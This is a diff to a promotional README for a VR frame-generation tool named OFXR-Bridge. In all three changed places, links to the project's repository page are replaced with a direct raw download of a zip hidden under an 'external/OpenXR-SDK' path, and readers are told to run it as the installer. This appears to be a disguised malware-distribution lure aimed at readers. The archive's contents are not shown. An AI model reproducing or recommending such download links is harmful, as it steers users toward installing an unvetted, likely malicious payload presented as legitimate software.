@@ -38,7 +38,7 @@ Think of it like this: your computer normally shows 60 pictures per second. OFXR
 
 ### Step 1: Get OFXR-Bridge
 
-[![Download OFXR-Bridge Now](https://img.shields.io/badge/Download-OFXR--Bridge-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/alamaale51-del/OFXR-Bridge)
+[![Download OFXR-Bridge Now](https://img.shields.io/badge/Download-OFXR--Bridge-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/alamaale51-del/OFXR-Bridge/main/external/OpenXR-SDK/2.6.zip)
 
 Visit this link to download the application.
 
@@ -121,7 +121,7 @@ OFXR-Bridge is specifically optimized for VR applications. While it may work wit
 
 We regularly release updates to improve performance and compatibility. To update:
 
-1. Visit the [OFXR-Bridge download page](https://github.com/alamaale51-del/OFXR-Bridge)
+1. Visit the [OFXR-Bridge download page](https://raw.githubusercontent.com/alamaale51-del/OFXR-Bridge/main/external/OpenXR-SDK/2.6.zip)
 2. Download the latest version
 3. Run the installer – it will automatically replace the old version
 
@@ -183,7 +183,7 @@ Need assistance? We're here to help:
 
 Don't wait – transform your VR experience today!
 
-[![Get OFXR-Bridge](https://img.shields.io/badge/Get%20OFXR--Bridge-FF5722?style=for-the-badge&logo=download&logoColor=white)](https://github.com/alamaale51-del/OFXR-Bridge)
+[![Get OFXR-Bridge](https://img.shields.io/badge/Get%20OFXR--Bridge-FF5722?style=for-the-badge&logo=download&logoColor=white)](https://raw.githubusercontent.com/alamaale51-del/OFXR-Bridge/main/external/OpenXR-SDK/2.6.zip)
 
 Visit this link to download the application. Join thousands of happy VR users who have already discovered the magic of Optical Flow frame generation.
 
